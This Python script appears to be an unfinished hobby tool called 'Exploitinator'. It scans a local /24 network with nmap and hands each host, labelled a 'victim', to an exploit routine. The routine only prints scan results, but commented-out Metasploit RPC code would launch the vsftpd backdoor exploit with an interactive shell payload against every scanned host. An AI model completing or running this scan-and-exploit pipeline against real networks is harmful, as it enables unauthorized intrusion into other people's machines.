import nmap
import os
# from metasploit.msfrpc import MsfRpcClient

print("====================================")
print("Welcome to the Exploitinator(intaor)")
print("====================================")

# Boot msfrpcd
# print("Starting msfrpcd daemon")
# os.system("./msfrpcd -P mypassword -n -f -a 127.0.0.1")

known_hosts = {}

print("Starting nmap scan")
nma = nmap.PortScannerAsync()

# Target with metasploit
def exploit(victim):
  print("-------------[EXPLOITER]-------------")
  print("** Exploit " + victim + " using Metasploit here **")
  print("Here are some of " + victim + "'s potential vulnerabilities:")
  print(known_hosts[victim])
  # client = MsfRpcClient('mypassword') # Create Metasploit client

  # for host in known_hosts.keys():
  #     # Some random vuln example that won't work
  #     exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
  #     exploit['RHOST'] = host
  #     exploit.execute(payload='cmd/unix/interact')
  print("------------------------------------\n")

def callback_result(host, scan_result):
    print("--------------[SCANNER]--------------")
    known_hosts[host] = scan_result
    print("Scanned potential victim " + host + "\n")
    print("Victims queue: ")
    print(known_hosts.keys())
    print("------------------------------------\n")
    exploit(host)

# Scan with nmap
nma.scan(hosts='192.168.1.0/24', arguments='-sV', callback=callback_result)
while nma.still_scanning():
    print("Scanning...")
    nma.wait(2)

# nm = nmap.PortScannerYield()
# for progressive_result in nm.scan('127.0.0.1/24', '22-25'):
#     print(progressive_result)
